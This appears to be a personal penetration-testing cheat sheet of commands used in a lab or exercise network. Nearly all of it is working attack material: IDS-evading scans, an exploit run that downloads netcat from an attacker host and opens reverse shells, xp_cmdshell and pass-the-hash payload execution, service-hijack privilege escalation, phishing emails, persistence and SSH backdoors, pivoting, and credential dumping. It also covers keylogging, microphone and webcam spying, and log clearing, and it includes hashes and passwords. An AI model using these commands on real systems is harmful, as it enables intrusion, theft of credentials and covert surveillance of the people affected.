**nslookup**
```bash
for i in {1..255}; do  
nslookup 192.156.0.$i >> dns.txt 2>/dev/null  
done
```

**nmap**
```bash
nmap -sS -sV -O -T4 -oA ~/Desktop/xtools/init-scan-192.156.0.0-24 192.156.0.0/24 -v

nmap -sSV -f --data-length <value> -D <decoy1>,<decoy2> -S <Diff_IP> -T1 -oA ~/Desktop/99MEU/External_Scans/evasion-scan-192.156.0.0-24 192.156.0.0/24 -v

nmap --script smb-os-discovery.nse 192.156.30.111
nmap --script default 192.156.30.111
nmap --script discovery 192.156.30.111
nmap --script external 192.156.30.111
nmap --script intrusive 192.156.30.111
nmap --script safe 192.156.30.111
nmap --script vuln 192.156.30.111
# -f for fragmenting packets to evade IDS
# --data-length <value> appends random data
# -D <devoy1>,<decoy2> (adidtional IPs ontop of the attacker IP)
# -S <IP_Address> spoofs as if another machine is scanning (instead of attacker IP)
# --script <category> | <scriptname> ... some need '--script-args' can use '--script-help <scriptname>'
```

**scanner**
```bash
msf> use auxiliary/scanner/portscan/tcp
```

**web**
```bash
nikto -host 192.156.0.6 -output niktoscan-192.156.0.6.txt        
```

**ftp**
```bash
ftp anonymous@192.156.0.86 
```

**Creating a user:**  
```bash
net user uwu Password123 /add
```

**Add user to local group:**  
```bash

net user uwu Password123 /add
net localgroup Administrators uwu /add
```

**Map drive:**
```bash
net use * \\192.156.0.6\C$ Password123 /USER:192.156.0.6\uwu                     # Or just download in meterpreter
# Run this on SQL box to Map C$ and new user on WEB so we can exfil from SQL
# Z on Web = C on SQL
```

**Download File with PowerShell**  
```powershell
Invoke-WebRequest -uri http://<URL>/file.exe -OutFile C:\\Safe\\Path\\file.exe
powershell -c Invoke-WebRequest -uri http://172.31.4.7//test_web
```

**Powershell Scan 1 Port**  
```bash
Test-NetConnection -ComputerName 192.156.0.6 -Port 445
```

**Windows Enum Commands**
```cmd
attrib /D /S C:\keyword*.* 2>NUL
findstr /P /I /S "keyword" C:\*.* 2>NUL
net use
	net use * \\192.168.0.5\C$ P@$$word /USER:192.168.0.5\superuser
netstat -ano
arp -a
route print
ipconfig /all
nbtstat -a <IP>            # or -s or -A 
```

**Start a Python Web Server**  
```bash
python3 -m http.server 80
```

**Start a netcat listener on an attack platform**  
```bash
nc -lvvp <port>
```

**Secretsdump**
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Execute a netcat reverse shell**  
```bash
nc <ip\_address> <port> -e cmd.exe
```

**Copy a file** 
```bash
copy <src\_file> <dst\_path\_filename>
```

**Copy multiple files** 
```bash
copy \* <dst\_path>
```

**Show network statistics**
```bash
netstat -ano
```

**View environment variables** 
```bash
set
```

**Move a file** 
```bash
copy <src\_path\_filename> <dst\_path\_filename>
move <src\_path\_filename> <dst\_path\_filename>
mv <src\_path\_filename> <dst\_path\_filename>
```

**Delete a file** 
```bash
del <path\_filename>
```

**Display file contents** 
```bash
type <path\_filename>
```

**Redirect output to a file (will overwrite existing file with same name)** 
```bash
<some\_command> > <path\_filename>
```

**Redirect (append) output to a file (will append to the end of a file with the same name)** 
```bash
<some\_command> >> <path\_filename>
```

**Configure Windows service to run cmd.exe to execute payload** 
```bash
“c:\\windows\\system32\\cmd.exe /k <path\_to\_payload>”
```

**PowerUp**
```bash
load powershell
powershell_import PowerUp.ps1
powershell_execute Invoke-AllChecks

# Needs these 3-4: Modifiable by a user (Everyone), Can be Restarted, and Has Modifiable Service Files/Modifiable Services, StartName = LocalSystem
```

**PrivEsc - Services Command**
```bash
// File Replacement - C:\Program Files (x86)\Photodex\ProShow Producer\ScsiAccess.exe
# Needs these 3-4: Modifiable by a user (Everyone), Can be Restarted, and Has **Modifiable Service Files**, StartName = LocalSystem

# Meterpreter
ps -S winlo
# Cmd
sc stop ScsiAccess
# Cmd
copy "C:\Program Files (x86)\Photodex\ProShow Producer\ScsiAccess.exe" "C:\Program Files (x86)\Photodex\ProShow Producer\ScsiAccess.bak"
# Meterpreter
upload revmettcp-6767.exe "C:\Program Files (x86)\Photodex\ProShow Producer\ScsiAccess.exe"
# Cmd - 30s...
sc start ScsiAccess
# New Session
migrate <pid>

// Service Modifications - "C:\Windows\System32\svchost.exe -k netsvcs -p"
# Needs these 3-4: Modifiable by a user (Everyone), Can be Restarted, and Has **Modifiable Services**, StartName = LocalSystem

# Cmd
sc stop SharedAccess
# Meterpreter
upload revmettcp-6767.exe "C:\Users\amy.fowler\Downloads\fun.exe"
# Cmd
sc qc SharedAccess
# Cmd - NOT POWERSHELL
sc config SharedAccess binPath= "cmd.exe /k C:\Users\amy.fowler\Downloads\fun.exe"
# Cmd - Be PATEINT
sc start SharedAccess
# New Session
ps -S winlo
migrate <pid>


// Other

move <service_path> <service_path.bak>
sc <server> [command] [service name] <options>
sc qc upnphost
sc config upnphost binPath= c:\evil_payload.exe
```

**Turn off Windows Firewall** 
```bash
netsh advfirewall set allprofiles state off
```

**Enable psexec using local accounts** 
```bash
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG\_DWORD /d 1 /f
```

**sql - windows command**
```sql
osql -U sa -P "PASSWORD" -S 192.168.0.5 -Q "select @@version"
.\osql.exe -U "sa" -P "M@rines1M@rines1" -S 192.156.0.7 -Q "select @@version"
.\osql.exe -U sa -P "M@rines1M@rines1" -S 192.156.0.7 -Q "SELECT name FROM sys.databases;"
.\osql.exe -U sa -P "M@rines1M@rines1" -S 192.156.0.7 -Q "SELECT * FROM <DATABASE>.information_schema.tables;"
.\osql.exe -U sa -P "M@rines1M@rines1" -S 192.156.0.7 -Q "xp_cmdshell whoami"
.\osql.exe -U sa -P "M@rines1M@rines1" -S 192.156.0.7 -Q "exec..xp_cmdshell'hostname'"
.\osql.exe -U sa -P "M@rines1M@rines1" -S 192.156.0.7 -Q "xp_cmdshell'powershell -c Get-MPPreference'"
.\osql.exe -U sa -P "M@rines1M@rines1" -S 192.156.0.7 -Q "xp_cmdshell'powershell -c Invoke-WebRequest -uri http://172.31.4.7/revmettcp-6767.exe -OutFile C:\\Backups\\revmettcp-6767.exe'"
.\osql.exe -U sa -P "M@rines1M@rines1" -S 192.156.0.7 -Q "xp_cmdshell'C:\\Backups\\revmettcp-6767.exe'"
```

**Scan Line (sl.exe)** 
```bash
sl -bhpt 80,100-200,443 10.0.0.1-200
.\sl.exe -bT 192.156.0.2-254
```

**Mirror a webpage** 
```bash
wget -r -l <layers\_deep...5> <url>
```

**Open a file in a text editor** 
```bash
vi <path\_filename> #Will work on any Linux host
leafpad <path\_filename> & #GUI only* 
gedit <path\_filename & #GUI only
```

**Search exploits**
```bash
searchsploit wing ftp
searchsploit -m 52347.py
```

**WingFTP Exploit - catch a shell**
```bash
python3 poc.py --url http://192.156.0.86/ -c 'whoami'
python3 poc.py --url http://192.156.0.86/ -c 'powershell -ep bypass ;; Invoke-WebRequest -uri http://172.31.4.7//nc.exe -OutFile C:\\Windows\\Temp\\nc.exe'
python3 poc.py --url http://192.156.0.86/ -c 'tasklist'
python3 poc.py --url http://192.156.0.86/ -c 'powershell Get-MPPreference'
# move nc.exe to the the ExclusionPath (this example is in Temp)
python3 poc.py --url http://192.156.0.86/ -c 'C:\\Windows\\Temp\\nc.exe 172.31.4.7 1111 -e cmd.exe'
```

**Invoke-SMBExec**
```powershell
powershell -ep bypass
Invoke-WebRequest -uri http://172.31.4.7//Invoke-SMBExec.ps1 -OutFile C:\\Windows\\Temp\Invoke-SMBExec.ps1
. .\Invoke-SMBExec.ps1
Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:9609e4fafc26935fe5f3d07ad2e46291 -Command "whoami"
Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:9609e4fafc26935fe5f3d07ad2e46291 -Command "powershell -c Invoke-WebRequest -uri http://172.31.4.7//test_web"   # Test if we are excuting commands
Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:9609e4fafc26935fe5f3d07ad2e46291 -Command 'powershell -c "get-process | out-file C:\inetpub\wwwroot\test.txt"'
Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:582e453029d04ba6652a3b08237c39f8 -Command 'powershell -c "get-mppreference | out-file C:\inetpub\wwwroot\test.txt"'
Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:582e453029d04ba6652a3b08237c39f8 -Command 'powershell -c "Invoke-WebRequest -uri http://172.31.4.7/revmettcp-6767.exe -OutFile C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\revmettcp-6767.exe"'
Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:582e453029d04ba6652a3b08237c39f8 -Command 'powershell -c "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\revmettcp-6767.exe"'

Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:582e453029d04ba6652a3b08237c39f8 -Command 'powershell -c "Invoke-WebRequest -uri http://172.31.4.7/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe"'
Invoke-SMBExec -Username Administrator -Target 192.156.0.6 -Hash aad3b435b51404eeaad3b435b51404ee:582e453029d04ba6652a3b08237c39f8 -Command 'powershell -c "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\nc.exe 172.31.4.7 2222 -e cmd.exe"'
```
### Bash

**SendEmail** 
```bash
sendemail -t sheldon.cooper@99meu.usmc.mil -f "G6 HelpDesk<helpdesk@99meu.usmc.mil>" -u "Password Reset" -m "Your password is about to expire. Click the following link to reset your password: http://172.31.4.7:8888/password_reset" -s 192.156.0.15:443 -o tls=no -a /root/Desktop/99MEU/Password_Reset.pdf

# .15 is the machine we enumerated had SMTP on port 443
```
  
***Multiple Recipients*** 
```bash
use payload/windows/x64/shell/reverse_tcp
generate -h
generate -f exe -o revshell-tcp-6767.exe     # after options are set

search fileformat/adobe
set DisablePayloadHandler True            # Set on this Adobe exploit! See _Prac_Apps notes

search hta_server
set DisablePayloadHandler True            # Set on this Adobe exploit! See _Prac_Apps notes

email=sheldon.cooper@99meu.usmc.mil,howard.wolowitz@99meu.usmc.mil,jonathan.hey@99meu.usmc.mil,amy.fowler@99meu.usmc.mil
sendemail -t $email -f "G6 HelpDesk<helpdesk@99meu.usmc.mil>" -u "Password Reset" -m "Your password is about to expire. Click the following link to reset your password: http://172.31.4.7:8888/password_reset" -s 192.156.0.15:443 -o tls=no -a /root/Desktop/99MEU/Password_Reset.pdf
```

**AV Bypass**
```powershell
tasklist
powershell Get-MPPrefernce
```

**Persistence Windows - LOTL**
```bash
// User-Level Persistence

(msf) generate payload and upload to Users downloads
(msf) drop into shell from the USER session
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /s
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /t reg_sz /v Persist /d "C:\Users\amy.fowler\Downloads\fun.exe"
shutdown /r /t 00                  # getprivs, user may not have SeShutdown

// System-Level Persistence

(msf) drop into shell from the SYSTEM session
sc create "servicename" binpath= "C:\Users\amy.fowler\Downloads\fun.exe" start= auto DisplayName= "Safe Malware"
sc description "servicename" "Definitely safe malware xD!"
sc qc servicename
shutdown /r /t 00
```

**Persistence Linux - LOTL**
```bash
ssh-keygen -t rsa -b 2048 -C "backdoor_key"
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
# put on target system with iwr or wget
C:\\ ssh -i id_rsa root@172.31.4.7        # Or `ssh -i id_rsa root@172.31.4.7`
```

**Pivoting**
```bash
# Setup pivot route (USER or SYSTEM session)
route -h
route add X.X.X.0 255.255.X.X <user_session_id>
route add 192.156.0.0 255.255.255.0 15
# Flush route if session dies! Then start new multihandler with new lport and attach new session to new route
route print
# Start pivot listener (make sure not in use on target - netstat)
use exploit/multi/handler
set lport 1111
set lhost 192.156.0.102       # Set to pivot box where we have phished (WS01)
exploit -j               # make sure it says "via the meterpreter session..."

Edit: /etc/proxychains4
use auxiliary/server/socks_proxy
run -j                                     # May need to do `netstat -netup` and `kill -9 <PID of port 1080>` in kali shell - CAREFUL
proxychains4 <command>                  # Needs to be a TCP full connect command
proxychains4 ssh -i id_rsa root@192.156.0.110
proxychains4 scp -i id_rsa barry.kripke@192.156.0.110:financialdata.txt /root/Desktop/financialdata.txt
proxychains4 firefox &
proxychains4 nmap -sT -p 80 192.156.0.87 -Pn                # Scan ONLY one IP!4
proxychains4 remmina &
proxychains4 xfreerdp /u:erick..da /p:etMjVz#VO2Jqus5g6OiI=+E_28v7UHTFNh /v:192.156.0.63

# MSF Port Forward from session
portfwd add -l 3389 -p 3389 -r 127.0.0.1
	xfreerdp /u:user /p:pass -r 127.0.0.1
portfwd add -l 8085 -p 80 -r 192.156.0.87
	firefox > http://192.156.0.87:8085
portfwd add -l 2222 -p 22 -r 192.156.0.151
	ssh -i id_rsa barry.kripke@127.0.0.1 -p 2222
```
## Metasploit

**Search within search** 
```bash
grep <string\_a> search <string\_b>
```

**Search within advanced options** 
```bash
grep <string> show advanced
```

**Reconnect to database** 
```bash
db\_disconnect
locate database.yml #select the first file path /usr/share/metasploit-framework/config/database.yml
sed -i 's/CHANGEME/172.31.21.6/g' /usr/share/metasploit-framework/config/database.yml
db\_connect -y /usr/share/metasploit-framework/config/database.yml
```

**MSF Commands**
```bash
// BASIC

back
use exploit/multi/handler     # ensure payloads match
set ExitOnSession False       # Continues listening after session is caught
nmap -sT -sV -O -T4 172.31.4.6 -p 5432  //  db_status   # Ensure postgres DB is OPEN --- diff ip than my LHOST
nmap -sSV -O -T4 -oA ~/Desktop/99MEU/init-scan-192.156.0.0-24 192.156.0.0/24
db_import ~/Desktop/99MEU/init-scan-192.156.0.0-24.xml
services
services -p 80 
services -s ftp
services -p 80 -R       # sets RHOST to hosts with port 80. '-R' must be last in command
hosts
vulns
creds
loot
search cve:2019 type:exploit app:client       # check 'search -h'
use      # auxiliary, exploit, payload, post
info
show options      # show exploits // show auxiliary // show targets & show payloads - use these after you pick an exploit!
set DisablePayloadHandler True/False     # Disables your listener!.. DONT USE
set RHOST <IP>      # OR unset
setg RHOST <IP>     # sets globally, can also unset... DONT USE
exploit -j // run -j     # runs in background
generate        # Use instead of msfvenom
set payload windowsx/x64/meterpreter/revers_tcp
jobs
use payload/windows/x64/meterpreter/reverse_tcp

# Move this to Windows Box via python web server and Remmina RDP 
set ExitOnSession False      # Ensure this is set on exploit/multi/handler
sessions
sessions -i 1
Ctrl+Z          # jobs && fg msfconsole --- incase msf is backgrounded

set payload windows/x64/shell/reverse_tcp     # Use this stageless but meterpreter
jobs -k 0       # KILLs a job
use payload/windows/x64/shell/reverse_tcp
generate -h
generate -f exe -o revshell-tcp-6767.exe     # after options are set

search fileformat/adobe
set DisablePayloadHandler True            # Set on this Adobe exploit! See _Prac_Apps notes

search hta_server
set DisablePayloadHandler True            # Set on this Adobe exploit! See _Prac_Apps notes

// RECON

search auxiliary/scanner/http
show auxiliary
use auxiliary/scanner/http/http_version     # http_login
use auxiliary/scanner/smb/smb_version       # smb_login

================ PERSISTENCE - Windows LOTL ================

// User-Level Persistence

(msf) generate payload and upload to Users downloads
(msf) drop into shell from the USER session
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /s
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /t reg_sz /v Persist /d "C:\Users\amy.fowler\Downloads\fun.exe"
shutdown /r /t 00                  # getprivs, user may not have SeShutdown

// System-Level Persistence

(msf) drop into shell from the SYSTEM session
sc create "servicename" binpath= "C:\Users\erick.tafel.da\Downloads\fun.exe" start= auto DisplayName= "Safe Malware"
sc description "servicename" "Definitely safe malware xD!"
sc qc servicename
shutdown /r /t 00

// SSH Backdoor

ssh-keygen -t rsa -b 2048 -C "backdoor_key"
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
# put on target system with iwr or wget
C:\\ ssh -i id_rsa root@172.31.4.7        # Or `ssh -i id_rsa root@172.31.4.7`

// Pivoting

# Setup pivot route
route -h
route add X.X.X.0 255.255.X.X <user_session_id>
route add 192.156.0.0 255.255.255.0 15
# Optional: use `route flush` to remove routes
# Route is flushed if session dies!
route print
# Start pivot listener (make sure not in use on target - netstat)
use exploit/multi/handler
set lport 1111
set lhost 192.156.0.102       # Set to pivot box where we have phished (WS01)
exploit -j               # make sure it says "via the meterpreter session..."

// Advanced Post-Exploitation

search post/windows/
use post/windows/manage/enable_rdp
	set forward true
	set lport 3389
	set session -i 9    # The 192.156.0.20 session
	run -j
use post/windows/gather/enum_shares
use post/windows/gather/enum_files                # Enum AND Download files
use post/multi/manage/autoroute
use post/windows/gather/dnscache_dump
use post/multi/gather/ping_sweep
use post/windows/gather/arp_scanner
use auxiliary/scanner/smb/smb_version
	set threads 42
	hosts -R                        # Using results from ping_sweep module
	run -j
# Can also run SOME of these modules in meterpreter session (e.g. below)
run post/windows/manage/enable_rdp
	set forward true
	set lport 3389
	set session -i 9    # The 192.156.0.20 session
	run -j
run post/windows/gather/enum_shares
run post/windows/gather/enum_files                # Enum AND Download files
run post/multi/manage/autoroute
run post/windows/gather/dnscache_dump
bgrun scraper
bgrun packetrecorder -i 1
run post/windows/gather/cachedump
# Credential Collections
use auxiliary/scanner/smb/smb_login    # After you find creds (PtH)
	set SMBUser
	set SMBPass
	set threads 3
	services -p 445 -R
	run -j
use windows/smb/psexec                 # After you find creds (PtH)
	set RHOSTs 192.156.0.20            # Valid login from smb_login
	set LHOST 192.156.0.102            # Pivot box
	set LPORT 1111                     # Pivot listener (from 2nd multi/handler)
	set SMBUser                        # Administrator or username
	set SMBPass                        # Valid hash from hashdump/smb_login
	set payload windows/x64/meterpreter/reverse_tcp
	set DisablePayloadHandler true
```

**meterpreter common commands**
```bash
help
---
background
bgrun
bglist
bgkill
info
run
use
lcd      # kali cd - use linux commands prepended with 'l'
upload
download
shell
arp
getproxy
portfwd
route
ifconfig
ipconfig
clearev
getprivs

ps
migrate <pid>               # USE when on a new shell
# Recommended SYSTEM processes to migrate: winlogon.exe, wininit.exe, services.exe

getpid
kill
pkill
localtime
steal_token
drop_token
sysinfo
pgrep
ps
reboot
shutdown
suspend
rev2self
search bypassuac

load powershell
powershell_execute "Get-ChildItem"
```

**Credential Collection & PrivEsc**
```bash
getsystem      # run as admin (GUI) or use a post module
hashdump            # Remember to migrate
timestomp
load incognito
list_tokens -u
impersonate_token domain\\user
# Create user that inherits all available tokens
add_user [username] [password]
add_user [username] [password] -h [DC_IP]
# Add a user to localgorup
add_localgroup_user [group] [username]
add_localgroup_user [group] [username] -h [DC_IP]
# Add a user to global group
add_group_user [group] [username]
add_group_user [group] [username] -h [DC_IP]
run post/windows/gather/enum_domain_tokens       # Migrate to SYSTEM process
run post/windows/gather/enum_tokens            # Migrate to SYSTEM process
load kiwi                      
creds_kerberos                  # Migrate to SYSTEM process
creds_wdigest                   # Migrate to SYSTEM process

search bypassuac
use exploit/windows/local/bypassuac
```

**Credential Locations**
```bash
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\System32\\config\\SYSTEM
C:\\Windows\NTDS\\ntds.dit                          # On Domain Controller
proxychains4 nxc smb 192.156.0.10 -u 'erick..da' -p '_@ej76ZLh34Qw#bUs+u1XKziluV2Md8r@EUHqhk' --ntds

```

**Keylogging**
```bash
keyscan_start
keyscan_dump
keyscan_stop
use post/windows/capture/keylog_recorder
```
---

**Misc Post Exploitation Modules**
```bash
# Inject another Meterpreter session
use post/windows/manage/multi_meterpreter_inject
	set IPLIST
	set DisablePayloadHandler true
	set LPORT 5555
	set payload windows/x64/meterpreter/reverse_tcp
	set PIDLIST <PIDs>
	set SESSION 1
	exploit -j
# Clearing Event logs
clearev
# Enable RDP
use post/windows/manage/enable_rdp
	set forward true
	set lport 3389
	set session -i 9    # The 192.156.0.20 session
	run -j
# Microphone Tapping
record_mic
# WebCam Spying
webcam_list
wevbcam_snap
webcam_stream
```

**MSF - Extra**
```bash
# add workspace "msf_intro". New database so nothing has been imported now
workspace
workspace -a msf_intro
workspace default
workspace msf_intro
# if DB is disconnected
locate database.yml
db_connect <first entry in locate> // or restart msfconsole
```
